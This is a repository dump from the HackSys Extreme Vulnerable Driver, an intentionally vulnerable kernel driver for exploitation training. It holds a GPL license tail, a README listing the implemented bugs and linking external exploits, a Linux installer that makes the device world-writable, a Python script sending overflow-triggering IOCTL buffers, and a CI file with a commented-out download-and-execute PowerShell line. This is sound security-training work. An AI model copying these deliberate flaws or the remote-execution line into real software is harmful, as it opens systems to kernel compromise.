patent license for this particular work, or (3) arrange, in a manner
consistent with the requirements of this License, to extend the patent
license to downstream recipients.  "Knowingly relying" means you have
actual knowledge that, but for the patent license, your conveying the
covered work in a country, or your recipient's use of the covered work
in a country, would infringe one or more identifiable patents in that
country that you have reason to believe are valid.

  If, pursuant to or in connection with a single transaction or
arrangement, you convey, or propagate by procuring conveyance of, a
covered work, and grant a patent license to some of the parties
receiving the covered work authorizing them to use, propagate, modify
or convey a specific copy of the covered work, then the patent license
you grant is automatically extended to all recipients of the covered
work and works based on it.

  A patent license is "discriminatory" if it does not include within
the scope of its coverage, prohibits the exercise of, or is
conditioned on the non-exercise of one or more of the rights that are
specifically granted under this License.  You may not convey a covered
work if you are a party to an arrangement with a third party that is
in the business of distributing software, under which you make payment
to the third party based on the extent of your activity of conveying
the work, and under which the third party grants, to any of the
parties who would receive the covered work from you, a discriminatory
patent license (a) in connection with copies of the covered work
conveyed by you (or copies made from those copies), or (b) primarily
for and in connection with specific products or compilations that
contain the covered work, unless you entered into that arrangement,
or that patent license was granted, prior to 28 March 2007.

  Nothing in this License shall be construed as excluding or limiting
any implied license or other defenses to infringement that may
otherwise be available to you under applicable patent law.

  12. No Surrender of Others' Freedom.

  If conditions are imposed on you (whether by court order, agreement or
otherwise) that contradict the conditions of this License, they do not
excuse you from the conditions of this License.  If you cannot convey a
covered work so as to satisfy simultaneously your obligations under this
License and any other pertinent obligations, then as a consequence you may
not convey it at all.  For example, if you agree to terms that obligate you
to collect a royalty for further conveying from those to whom you convey
the Program, the only way you could satisfy both those terms and this
License would be to refrain entirely from conveying the Program.

  13. Use with the GNU Affero General Public License.

  Notwithstanding any other provision of this License, you have
permission to link or combine any covered work with a work licensed
under version 3 of the GNU Affero General Public License into a single
combined work, and to convey the resulting work.  The terms of this
License will continue to apply to the part which is the covered work,
but the special requirements of the GNU Affero General Public License,
section 13, concerning interaction through a network will apply to the
combination as such.

  14. Revised Versions of this License.

  The Free Software Foundation may publish revised and/or new versions of
the GNU General Public License from time to time.  Such new versions will
be similar in spirit to the present version, but may differ in detail to
address new problems or concerns.

  Each version is given a distinguishing version number.  If the
Program specifies that a certain numbered version of the GNU General
Public License "or any later version" applies to it, you have the
option of following the terms and conditions either of that numbered
version or of any later version published by the Free Software
Foundation.  If the Program does not specify a version number of the
GNU General Public License, you may choose any version ever published
by the Free Software Foundation.

  If the Program specifies that a proxy can decide which future
versions of the GNU General Public License can be used, that proxy's
public statement of acceptance of a version permanently authorizes you
to choose that version for the Program.

  Later license versions may give you additional or different
permissions.  However, no additional obligations are imposed on any
author or copyright holder as a result of your choosing to follow a
later version.

  15. Disclaimer of Warranty.

  THERE IS NO WARRANTY FOR THE PROGRAM, TO THE EXTENT PERMITTED BY
APPLICABLE LAW.  EXCEPT WHEN OTHERWISE STATED IN WRITING THE COPYRIGHT
HOLDERS AND/OR OTHER PARTIES PROVIDE THE PROGRAM "AS IS" WITHOUT WARRANTY
OF ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING, BUT NOT LIMITED TO,
THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR
PURPOSE.  THE ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE PROGRAM
IS WITH YOU.  SHOULD THE PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF
ALL NECESSARY SERVICING, REPAIR OR CORRECTION.

  16. Limitation of Liability.

  IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING
WILL ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MODIFIES AND/OR CONVEYS
THE PROGRAM AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES, INCLUDING ANY
GENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING OUT OF THE
USE OR INABILITY TO USE THE PROGRAM (INCLUDING BUT NOT LIMITED TO LOSS OF
DATA OR DATA BEING RENDERED INACCURATE OR LOSSES SUSTAINED BY YOU OR THIRD
PARTIES OR A FAILURE OF THE PROGRAM TO OPERATE WITH ANY OTHER PROGRAMS),
EVEN IF SUCH HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE POSSIBILITY OF
SUCH DAMAGES.

  17. Interpretation of Sections 15 and 16.

  If the disclaimer of warranty and limitation of liability provided
above cannot be given local legal effect according to their terms,
reviewing courts shall apply local law that most closely approximates
an absolute waiver of all civil liability in connection with the
Program, unless a warranty or assumption of liability accompanies a
copy of the Program in return for a fee.

                     END OF TERMS AND CONDITIONS

            How to Apply These Terms to Your New Programs

  If you develop a new program, and you want it to be of the greatest
possible use to the public, the best way to achieve this is to make it
free software which everyone can redistribute and change under these terms.

  To do so, attach the following notices to the program.  It is safest
to attach them to the start of each source file to most effectively
state the exclusion of warranty; and each file should have at least
the "copyright" line and a pointer to where the full notice is found.

    <one line to give the program's name and a brief idea of what it does.>
    Copyright (C) <year>  <name of author>

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.

Also add information on how to contact you by electronic and paper mail.

  If the program does terminal interaction, make it output a short
notice like this when it starts in an interactive mode:

    <program>  Copyright (C) <year>  <name of author>
    This program comes with ABSOLUTELY NO WARRANTY; for details type `show w'.
    This is free software, and you are welcome to redistribute it
    under certain conditions; type `show c' for details.

The hypothetical commands `show w' and `show c' should show the appropriate
parts of the General Public License.  Of course, your program's commands
might be different; for a GUI interface, you would use an "about box".

  You should also get your employer (if you work as a programmer) or school,
if any, to sign a "copyright disclaimer" for the program, if necessary.
For more information on this, and how to apply and follow the GNU GPL, see
<https://www.gnu.org/licenses/>.

  The GNU General Public License does not permit incorporating your program
into proprietary programs.  If your program is a subroutine library, you
may consider it more useful to permit linking proprietary applications with
the library.  If this is what you want to do, use the GNU Lesser General
Public License instead of this License.  But first, please read
<https://www.gnu.org/licenses/why-not-lgpl.html>.

```

`README.md`:

```md
# HackSys Extreme Vulnerable Driver

               ooooo   ooooo oooooooooooo oooooo     oooo oooooooooo.   
               `888'   `888' `888'     `8  `888.     .8'  `888'   `Y8b  
                888     888   888           `888.   .8'    888      888 
                888ooooo888   888oooo8       `888. .8'     888      888 
                888     888   888    "        `888.8'      888      888 
                888     888   888       o      `888'       888     d88' 
               o888o   o888o o888ooooood8       `8'       o888bood8P'   

------------------------------------------------------------------------

[![Black Hat Arsenal](https://www.toolswatch.org/badges/arsenal/2016.svg)](https://www.blackhat.com/asia-16/arsenal.html#hacksys-extreme-vulnerable-driver)
[![Appveyor Build Status](https://ci.appveyor.com/api/projects/status/o0i4crgqxjfnqf1s/branch/master?svg=true)](https://ci.appveyor.com/project/hacksysteam/hacksysextremevulnerabledriver/branch/master)
[![GitHub all Releases](https://img.shields.io/github/downloads/hacksysteam/HackSysExtremeVulnerableDriver/total)](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/releases)
[![Twitter Follow](https://img.shields.io/twitter/follow/HackSysTeam?style=social)](https://twitter.com/HackSysTeam)
[![Mastodon Follow](https://img.shields.io/mastodon/follow/109291325205105061?domain=https%3A%2F%2Finfosec.exchange&style=social)](https://infosec.exchange/@hacksysteam)
[![Discord Server](https://dcbadge.vercel.app/api/server/ns32uNhaq7?style=flat)](https://discord.com/invite/ns32uNhaq7)

The **HackSys Extreme Vulnerable Driver (HEVD)** is a **Windows Kernel** driver that is intentionally vulnerable. It has been developed for **security researchers** and **enthusiasts** to improve their skills in **kernel-level** exploitation.

**HEVD** offers a range of vulnerabilities, from simple **stack buffer overflows** to more complex issues such as **use-after-free**, **pool buffer overflows**, and **race conditions**. This allows researchers to explore exploitation techniques for each implemented vulnerability.


## Black Hat Arsenal 2016

* [Presentation](https://www.blackhat.com/docs/asia-16/materials/arsenal/asia-16-Ansari-HackSys-Extreme-Vulnerable-Driver.pdf)
* [White Paper](https://www.blackhat.com/docs/asia-16/materials/arsenal/asia-16-Ansari-HackSys-Extreme-Vulnerable-Driver-wp.pdf)


## Blog Post

* <http://www.payatu.com/hacksys-extreme-vulnerable-driver/>


## External Exploits

* <https://github.com/wetw0rk/Exploit-Development/tree/master/HEVD-Exploits>
* <https://github.com/sam-b/HackSysDriverExploits>
* <https://github.com/sizzop/HEVD-Exploits>
* <https://github.com/badd1e/bug-free-adventure>
* <https://github.com/FuzzySecurity/HackSysTeam-PSKernelPwn>
* <https://github.com/theevilbit/exploits/tree/master/HEVD>
* <https://github.com/GradiusX/HEVD-Python-Solutions>
* <http://pastebin.com/ALKdpDsF>
* <https://github.com/Cn33liz/HSEVD-StackOverflow>
* <https://github.com/Cn33liz/HSEVD-StackOverflowX64>
* <https://github.com/Cn33liz/HSEVD-StackCookieBypass>
* <https://github.com/Cn33liz/HSEVD-ArbitraryOverwrite>
* <https://github.com/Cn33liz/HSEVD-ArbitraryOverwriteGDI>
* <https://github.com/Cn33liz/HSEVD-StackOverflowGDI>
* <https://github.com/Cn33liz/HSEVD-ArbitraryOverwriteLowIL>
* <https://github.com/mgeeky/HEVD_Kernel_Exploit>
* <https://github.com/tekwizz123/HEVD-Exploit-Solutions>
* <https://github.com/FULLSHADE/Windows-Kernel-Exploitation-HEVD>
* <https://github.com/w4fz5uck5/3XPL01t5/tree/master/OSEE_Training>


## External Blog Posts

* <https://wetw0rk.github.io/posts/0x00-introduction-to-windows-kernel-exploitation/>
* <https://wetw0rk.github.io/posts/0x00-introducci%C3%B3n-a-windows-kernel-explotaci%C3%B3n/>
* <https://wetw0rk.github.io/posts/0x01-killing-windows-kernel-mitigations/>
* <https://wetw0rk.github.io/posts/0x01-mat%C3%A1ndo-windows-kernel-mitigaciones/>
* <https://wetw0rk.github.io/posts/0x02-introduction-to-windows-kernel-uafs/>
* <https://wetw0rk.github.io/posts/0x02-introducci%C3%B3n-a-windows-kernel-uafs/>
* <https://wetw0rk.github.io/posts/0x03-approaching-the-modern-windows-kernel-heap/>
* <https://wetw0rk.github.io/posts/0x03-acerc%C3%A1ndose-al-heap-moderno-del-windows-kernel/>
* <https://wetw0rk.github.io/posts/0x04-writing-what-where-in-the-kernel/>
* <https://wetw0rk.github.io/posts/0x04-escribiendo-que-donde-en-el-kernel/>
* <https://wetw0rk.github.io/posts/0x05-introduction-to-windows-kernel-type-confusion-vulnerabilities/>
* <https://wetw0rk.github.io/posts/0x05-introducci%C3%B3n-a-windows-kernel-type-confusion-vulnerabilidades/>
* <https://wetw0rk.github.io/posts/0x06-approaching-modern-windows-kernel-type-confusions/>
* <https://wetw0rk.github.io/posts/0x06-acerc%C3%A1ndose-a-windows-kernel-type-confusions-modernos/>
* <https://wetw0rk.github.io/posts/0x07-introduction-to-windows-kernel-race-conditions/>
* <https://wetw0rk.github.io/posts/0x07-introducci%C3%B3n-a-windows-kernel-race-conditions/>
* <https://wetw0rk.github.io/posts/0x08-modern-windows-kernel-race-conditions/>
* <https://wetw0rk.github.io/posts/0x08-race-conditions-moderno-del-windows-kernel/>
* <https://wetw0rk.github.io/posts/0x09-return-of-the-stack-overflow/>
* <https://wetw0rk.github.io/posts/0x09-el-regreso-del-stack-overflow/>
* <http://niiconsulting.com/checkmate/2016/01/windows-kernel-exploitation/>
* <http://samdb.xyz/2016/01/16/intro_to_kernel_exploitation_part_0.html>
* <http://samdb.xyz/2016/01/17/intro_to_kernel_exploitation_part_1.html>
* <http://samdb.xyz/2016/01/18/intro_to_kernel_exploitation_part_2.html>
* <http://samdb.xyz/2017/06/22/intro_to_kernel_exploitation_part_3.html>
* <https://sizzop.github.io/2016/07/05/kernel-hacking-with-hevd-part-1.html>
* <https://sizzop.github.io/2016/07/06/kernel-hacking-with-hevd-part-2.html>
* <https://sizzop.github.io/2016/07/07/kernel-hacking-with-hevd-part-3.html>
* <https://sizzop.github.io/2016/07/08/kernel-hacking-with-hevd-part-4.html>
* <https://www.fuzzysecurity.com/tutorials/expDev/14.html>
* <https://www.fuzzysecurity.com/tutorials/expDev/15.html>
* <https://www.fuzzysecurity.com/tutorials/expDev/16.html>
* <https://www.fuzzysecurity.com/tutorials/expDev/17.html>
* <https://www.fuzzysecurity.com/tutorials/expDev/18.html>
* <https://www.fuzzysecurity.com/tutorials/expDev/19.html>
* <https://www.fuzzysecurity.com/tutorials/expDev/20.html>
* <http://dokydoky.tistory.com/445>
* <https://hshrzd.wordpress.com/2017/05/28/starting-with-windows-kernel-exploitation-part-1-setting-up-the-lab/>
* <https://hshrzd.wordpress.com/2017/06/05/starting-with-windows-kernel-exploitation-part-2/>
* <https://hshrzd.wordpress.com/2017/06/22/starting-with-windows-kernel-exploitation-part-3-stealing-the-access-token/>
* <https://osandamalith.com/2017/04/05/windows-kernel-exploitation-stack-overflow/>
* <https://osandamalith.com/2017/06/14/windows-kernel-exploitation-arbitrary-overwrite/>
* <https://osandamalith.com/2017/06/22/windows-kernel-exploitation-null-pointer-dereference/>
* <http://dali-mrabet1.rhcloud.com/windows-kernel-exploitation-arbitrary-memory-overwrite-hevd-challenges/>
* <https://blahcat.github.io/2017/08/31/arbitrary-write-primitive-in-windows-kernel-hevd/>
* <https://klue.github.io/blog/2017/09/hevd_stack_gs/>
* <https://glennmcgui.re/introduction-to-windows-kernel-exploitation-pt-1/>
* <https://glennmcgui.re/introduction-to-windows-kernel-driver-exploitation-pt-2/>
* <https://kristal-g.github.io/2021/02/07/HEVD_StackOverflowGS_Windows_10_RS5_x64.html>
* <https://kristal-g.github.io/2021/02/20/HEVD_Type_Confusion_Windows_10_RS5_x64.html>
* <https://wafzsucks.medium.com/hacksys-extreme-vulnerable-driver-arbitrary-write-null-new-solution-7d45bfe6d116>
* <https://wafzsucks.medium.com/how-a-simple-k-typeconfusion-took-me-3-months-long-to-create-a-exploit-f643c94d445f>
* <https://mdanilor.github.io/posts/hevd-0/>
* <https://mdanilor.github.io/posts/hevd-1/>
* <https://mdanilor.github.io/posts/hevd-2/>
* <https://mdanilor.github.io/posts/hevd-3/>
* <https://mdanilor.github.io/posts/hevd-4/>

## Author

> **Ashfaq Ansari**

> ashfaq[at]hacksys[dot]io

> **[Blog](https://hacksys.io/ "HackSys Team") | [@HackSysTeam](https://twitter.com/HackSysTeam)**

> [![HackSys Inc](https://hacksys.io/android-chrome-192x192.png "HackSys Inc")](https://hacksys.io)

> [https://hacksys.io/](https://hacksys.io/ "HackSys Inc")


## Screenshots

![Driver Banner](Screenshots/hevd-banner.png "Driver Banner")

![Help](Screenshots/hevd-help.png "Help")

![Exploitation](Screenshots/hevd-exploitation.png "Exploitation")

![Driver Debug Print](Screenshots/hevd-debug-print.png "Driver Debug Print")


## Vulnerabilities Implemented

* **Write NULL**
* **Double Fetch**
* **Buffer Overflow**
  * **Stack**
  * **Stack GS**
  * **NonPagedPool**
  * **NonPagedPoolNx**
  * **PagedPoolSession**
* **Use After Free**
  * **NonPagedPool**
  * **NonPagedPoolNx**
* **Type Confusion**
* **Integer Overflow**
  * **Arithmetic Overflow**
* **Memory Disclosure**
  * **NonPagedPool**
  * **NonPagedPoolNx**
* **Arbitrary Increment**
* **Arbitrary Overwrite**
* **Null Pointer Dereference**
* **Uninitialized Memory**
  * **Stack**
  * **NonPagedPool**
* **Insecure Kernel Resource Access**


## Building the driver

1. [Install Visual Studio 2017](https://visualstudio.microsoft.com/downloads/)
2. [Install Windows Driver Kit](https://docs.microsoft.com/en-us/windows-hardware/drivers/download-the-wdk)
3. Run the appropriate driver builder `Build_HEVD_Vulnerable_x86.bat` or `Build_HEVD_Vulnerable_x64.bat`


## Download

If you do not want to build **HackSys Extreme Vulnerable Driver** from source, you could download pre-built
executables for the latest release:

[https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/releases](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/releases)


## Installing the driver

Use [OSR Driver Loader](https://www.osronline.com/article.cfm?article=157) to install **HackSys Extreme Vulnerable Driver**


## Testing

The **HackSys Extreme Vulnerable Driver** and the respective exploits have been tested on **Windows 7 SP1 x86** and **Windows 10 x64**  


## Sessions Conducted

* [Windows Kernel Exploitation 1](http://null.co.in/event_sessions/156-windows-kernel-exploitation)
* [Windows Kernel Exploitation 2](http://null.co.in/event_sessions/186-windows-kernel-exploitation-2)
* [Windows Kernel Exploitation 3](http://null.co.in/event_sessions/226-windows-kernel-exploitation-3)
* [Windows Kernel Exploitation 4](http://null.co.in/event_sessions/234-windows-kernel-exploitation-4)
* [Windows Kernel Exploitation 5](http://null.co.in/event_sessions/309-windows-kernel-exploitation-5)
* [Windows Kernel Exploitation 6](https://null.co.in/event_sessions/482-windows-kernel-exploitation-6)
* [Windows Kernel Exploitation 7](https://null.co.in/event_sessions/845-windows-kernel-exploitation-7)


## Workshops Conducted

* [Windows Kernel Exploitation Humla Pune](http://null.co.in/event_sessions/280-windows-kernel-exploitation)
* [Windows Kernel Exploitation Humla Mumbai](http://null.co.in/event_sessions/327-windows-kernel-exploitation)


## HEVD for Linux

![Linux HEVD Driver Banner](Screenshots/hevd-linux-banner.png "Linux HEVD Driver Banner")

![Linux HEVD Driver Installer](Screenshots/hevd-linux-install-uninstall.png "Linux HEVD Driver Installer")

![Linux HEVD Driver IOTCL Tests](Screenshots/hevd-linux-ioctl-tests.png "Linux HEVD Driver IOTCL Tests")

![Linux HEVD Driver IOTCL Log](Screenshots/hevd-linux-ioctl-log.png "Linux HEVD Driver IOTCL Log")


## License

Please see the file `LICENSE` for copying permission


## Contribution Guidelines

Please see the file `CONTRIBUTING.md` for contribution guidelines


## TODO & Bug Reports

Please file any enhancement request or bug report via the **GitHub** issue tracker at the below-given address: [https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/issues](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/issues)


## Acknowledgments

Thanks go to these wonderful people: 🎉

<a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/graphs/contributors">
  <img src="https://contrib.rocks/image?repo=hacksysteam/HackSysExtremeVulnerableDriver" />
</a>

------------------------------------------------------------------------

[![HackSys Inc](https://hacksys.io/android-chrome-192x192.png "HackSys Inc")](https://hacksys.io)

```

`Tools/hevd_linux_installer.sh`:

```sh
#!/usr/bin/env bash

if [ "$#" -ne 1 ]; then
    echo "❗ Usage: $0 {install|uninstall}"
    exit 1
fi

CURRENT_DIR=${PWD}
BUILD_ARCH=x64
PROJECT_NAME=hevd
PROJECT_ROOT="$(readlink -f ${CURRENT_DIR}/../)"
BUILD_DIR="${PROJECT_ROOT}/build/driver/linux/vulnerable/${BUILD_ARCH}"
MODULE_PATH="${BUILD_DIR}/${PROJECT_NAME}.ko"
HEVD_DEVICE_PATH="/dev/HackSysExtremeVulnerableDriver"

# Run this script as root
if [ "$(id -u)" != "0" ]; then
    echo "🚫 This script must be run as root"
    exit 1
fi

if [ ! -f "${MODULE_PATH}" ]; then
    echo "🔍 Kernel module not found: ${MODULE_PATH}"
    exit 1
fi

case "$1" in
    install)
        # Load the kernel module
        insmod "${MODULE_PATH}"

        if [ $? -eq 0 ]; then
            echo "✅ Kernel module loaded successfully"

            # Change the permissions of the device file
            sleep 1
            chmod a+rw "${HEVD_DEVICE_PATH}"
            echo "🔒 Permissions updated: ${HEVD_DEVICE_PATH}"
        else
            echo "❌ Failed to load kernel module: ${MODULE_PATH}"
            exit 1
        fi
        ;;
    uninstall|remove)
        # Unload the kernel module
        rmmod "${PROJECT_NAME}"

        if [ $? -eq 0 ]; then
            echo "✅ Kernel module unloaded successfully"
        else
            echo "❌ Failed to unload kernel module: ${PROJECT_NAME}"
            exit 1
        fi
        ;;
    *)
        echo "❗ Invalid option: $1"
        echo "❗ Usage: $0 {install|uninstall}"
        exit 1
        ;;
esac

```

`Tools/hevd_linux_tests.py`:

```py
import ctypes
import fcntl
import os


IOCPARM_MASK = 0x1fff
IOC_OUT = 0x40000000
IOC_IN = 0x80000000
IOC_INOUT = IOC_IN | IOC_OUT


def _IOC(inout, group, number, len):
    return (inout | ((len & IOCPARM_MASK) << 16) | ((group) << 8) | (number))

def _IOWR(group, number, type):
    return _IOC(IOC_INOUT, ord(group), number, ctypes.sizeof(type))


class HEVD_IO(ctypes.Structure):
    _fields_ = [
        ("input_buffer", ctypes.c_void_p),
        ("input_buffer_length", ctypes.c_size_t),
        ("output_buffer", ctypes.c_void_p),
        ("output_buffer_length", ctypes.c_size_t),
    ]


def IOCTL(number):
    return _IOWR('h', number, HEVD_IO)


DEVICE_PATH = "/dev/HackSysExtremeVulnerableDriver"

# IOCTL codes
HEVD_IOCTL_BUFFER_OVERFLOW_STACK = IOCTL(0)
# HEVD_IOCTL_BUFFER_OVERFLOW_STACK_GS = IOCTL(1)
# HEVD_IOCTL_ARBITRARY_WRITE = IOCTL(2)
# HEVD_IOCTL_BUFFER_OVERFLOW_KERNEL_HEAP = IOCTL(3)
# HEVD_IOCTL_ALLOCATE_UAF_OBJECT_KERNEL_HEAP = IOCTL(4)
# HEVD_IOCTL_USE_UAF_OBJECT_KERNEL_HEAP = IOCTL(5)
# HEVD_IOCTL_FREE_UAF_OBJECT_KERNEL_HEAP = IOCTL(6)
# HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_KERNEL_HEAP = IOCTL(7)
# HEVD_IOCTL_TYPE_CONFUSION = IOCTL(8)
HEVD_IOCTL_INTEGER_OVERFLOW = IOCTL(9)
# HEVD_IOCTL_NULL_POINTER_DEREFERENCE = IOCTL(0xA)
# HEVD_IOCTL_UNINITIALIZED_MEMORY_STACK = IOCTL(0xB)
# HEVD_IOCTL_UNINITIALIZED_MEMORY_KERNEL_HEAP = IOCTL(0xC)
# HEVD_IOCTL_DOUBLE_FETCH = IOCTL(0xD)


def trigger_ioctl(ioctl, hevd_io):
    device_fd = os.open(DEVICE_PATH, os.O_RDWR)

    try:
        status = fcntl.ioctl(device_fd, ioctl, hevd_io)
    except Exception as exc:
        print(f"💥 Exception in IOCTL: {exc}")
        return

    if status == 0:
        print("✅ IOCTL executed successfully!")
    else:
        print(f"❌ Failed to execute IOCTL. Status code: {status}")

    os.close(device_fd)


if __name__ == "__main__":
    print(f"🏆 HackSys Extreme Vulnerable Driver (HEVD) - Linux 🏆")

    # Tests for each IOCTL
    print()
    print(f"🚀 Triggering: HEVD_IOCTL_BUFFER_OVERFLOW_STACK - 0x{HEVD_IOCTL_BUFFER_OVERFLOW_STACK:X}")

    input_buffer_size = 0x1000
    input_buffer_data = b"A" * input_buffer_size
    input_buffer = ctypes.create_string_buffer(input_buffer_data)

    user_hevd_io = HEVD_IO()
    user_hevd_io.input_buffer = ctypes.cast(input_buffer, ctypes.c_void_p)
    user_hevd_io.input_buffer_length = len(input_buffer_data)

    print(f"\t🔵 Input buffer: 0x{ctypes.addressof(input_buffer):X}")
    print(f"\t🔵 Input buffer length: 0x{input_buffer_size:X}")

    trigger_ioctl(HEVD_IOCTL_BUFFER_OVERFLOW_STACK, user_hevd_io)

    print()
    print(f"🚀 Triggering: HEVD_IOCTL_INTEGER_OVERFLOW - 0x{HEVD_IOCTL_INTEGER_OVERFLOW:X}")

    input_buffer_size = 0x800
    input_buffer_data = b"A" * input_buffer_size
    input_buffer = ctypes.create_string_buffer(input_buffer_data)

    user_hevd_io = HEVD_IO()
    user_hevd_io.input_buffer = ctypes.cast(input_buffer, ctypes.c_void_p)
    user_hevd_io.input_buffer_length = len(input_buffer_data)

    print(f"\t🔵 Input buffer: 0x{ctypes.addressof(input_buffer):X}")
    print(f"\t🔵 Input buffer length: 0x{input_buffer_size:X}")

    trigger_ioctl(HEVD_IOCTL_INTEGER_OVERFLOW, user_hevd_io)

```

`appveyor.yml`:

```yml
# HEVD appveyor configuration

#---------------------------------#
#      general configuration      #
#---------------------------------#

# version format
version: 3.0.{build}

# branches to build
branches:
  # whitelist
  only:
  - master

# Do not build on tags (GitHub and BitBucket)
skip_tags: true

# Do not build feature branch with open Pull Requests
# skip_branch_with_pr: true

# Maximum number of concurrent jobs for the project
max_jobs: 1

#---------------------------------#
#    environment configuration    #
#---------------------------------#

# Build worker image (VM template)
image:
  - Visual Studio 2017
  - Ubuntu

# fetch repository as zip archive
# default is "false"
shallow_clone: true

# set clone depth
# clone entire repository history if not defined
clone_depth: 1

# this is how to allow failing jobs in the matrix
# environment:
#   matrix:
#   - job_name: Build HEVD for Windows
#   - job_name: Build HEVD for Linux
#     job_depends_on: Build HEVD for Windows
#   - job_name: Package HEVD
#     job_depends_on: Build HEVD for Linux

matrix:
  fast_finish: true

for:
  - matrix:
      only:
        - image: Visual Studio 2017
    clone_folder: c:\projects\hevd
    build_script:
      - cmd: cd c:\projects\hevd\Builder
      - cmd: Build_HEVD_All.bat
    after_build:
      - cmd: 7z a c:\projects\hevd\HEVD.zip c:\projects\hevd\build\*
  
  - matrix:
      only:
        - image: Ubuntu
    clone_folder: /home/appveyor/projects/hevd
    build_script:
      - sh: cd /home/appveyor/projects/hevd/Builder
      - sh: sh Build_HEVD_All.sh
    after_build:
      - sh: 7z a /home/appveyor/projects/hevd/HEVD.zip /home/appveyor/projects/hevd/build/*

# disable test
test: off

# artifacts
artifacts:
  - path: HEVD.zip

# disable deployment
deploy: off


# remote desktop debugging
# environment:
#   APPVEYOR_RDP_PASSWORD: Passw0rd!

# on_finish:
#   - ps: $blockRdp = $true; iex ((new-object net.webclient).DownloadString('https://raw.githubusercontent.com/appveyor/ci/master/scripts/enable-rdp.ps1'))

```